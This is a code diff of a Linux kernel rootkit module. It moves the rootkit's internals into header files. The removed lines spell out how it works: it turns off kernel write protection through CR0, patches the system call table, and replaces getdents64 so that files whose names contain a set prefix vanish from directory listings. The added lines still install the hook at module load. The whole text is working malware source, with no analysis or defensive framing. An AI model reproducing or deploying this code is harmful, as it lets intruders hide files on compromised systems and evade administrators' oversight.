@@ -1,115 +1,18 @@
-#include <asm/paravirt.h>
-#include <asm/segment.h>
-#include <asm/syscall.h>
-#include <asm/unistd_64.h>
-#include <linux/dirent.h>
-#include <linux/fcntl.h>
-#include <linux/file.h>
-#include <linux/fs.h>
+
 #include <linux/init.h>
-#include <linux/kallsyms.h>
-#include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/ptrace.h>
-#include <linux/sched.h>
-#include <linux/slab.h>
-#include <linux/syscalls.h>
-#include <linux/uaccess.h>
+#include <linux/kernel.h>
+#include <linux/kallsyms.h>
 #include <linux/version.h>
 
-#define TAINTED_PREFIX "Aa1234"
-
-static sys_call_ptr_t *sys_call_table_original;
-static sys_call_ptr_t sys_call_table_copy[__NR_syscall_max + 1] = { NULL };
-extern unsigned long __force_order;
-
-static inline void write_cr0_forced(unsigned long val)
-{
-    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
-}
-
-static inline void unprotect_memory(void)
-{
-    write_cr0_forced(read_cr0() & ~X86_CR0_WP);
-}
-
-static inline void protect_memory(void)
-{
-    write_cr0_forced(read_cr0() | X86_CR0_WP);
-}
-
-static void hook_syscall(unsigned long nr, unsigned long faddr)
-{
-    unprotect_memory();
-
-    sys_call_table_copy[nr] = sys_call_table_original[nr];
-    sys_call_table_original[nr] = faddr;
-
-    protect_memory();
-}
-
-static void unhook_all(void)
-{
-    int i;
-
-    unprotect_memory();
-
-    for (i = 0; i < __NR_syscall_max + 1; i++)
-        if (sys_call_table_copy[i]) 
-            sys_call_table_original[i] = sys_call_table_copy[i];
-
-    protect_memory();
-}
-
-int sys_getdents64_fake(struct pt_regs *regs)
-{
-    struct linux_dirent64 *dirent = regs->si;
-    struct linux_dirent64 *curr_dirent;
-    unsigned short curr_len;
-    char *buffer;
-    unsigned long setback = 0;
-    unsigned long pos;
-    int len;
-    int error;
-
-    error = sys_call_table_copy[__NR_getdents64](regs);
-
-    if (error < 0)
-        return error;
-
-    len = error;
-
-    buffer = kmalloc(len, GFP_KERNEL);
-
-    copy_from_user(buffer, dirent, len);
-
-    for (pos = 0; pos < len;)
-    {
-        curr_dirent = (struct linux_dirent64 *)(buffer + pos);
-        curr_len = curr_dirent->d_reclen;
-
-        if (strstr(curr_dirent->d_name, TAINTED_PREFIX))
-            setback += curr_len;
-        else if (setback)
-            memcpy((void *)((unsigned long)curr_dirent - setback), curr_dirent, curr_len);
-
-        pos += curr_len;
-    }
-
-    memset(buffer + len - setback, 0, setback);
-
-    copy_to_user(dirent, buffer, len);
-
-    kfree(buffer);
-
-    return len - setback;
-}
+#include "hooker.h"
+#include "fake_syscalls.h"
 
 static int __init init_rootkit(void)
 {
     sys_call_table_original = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");
     
-    hook_syscall(__NR_getdents64, (unsigned long)sys_getdents64_fake);
+    hook_syscall(__NR_getdents64, sys_getdents64_fake);
 
     return 0;
 }
